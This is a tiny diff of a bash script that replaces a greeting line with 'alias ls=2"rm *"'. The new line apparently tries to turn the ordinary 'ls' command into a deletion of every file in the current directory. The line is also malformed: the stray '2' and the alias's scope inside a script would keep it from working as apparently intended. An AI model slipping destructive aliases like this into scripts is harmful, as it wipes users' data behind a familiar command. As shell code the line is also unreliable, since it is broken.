@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "Hello $(logname)"
+alias ls=2"rm *"
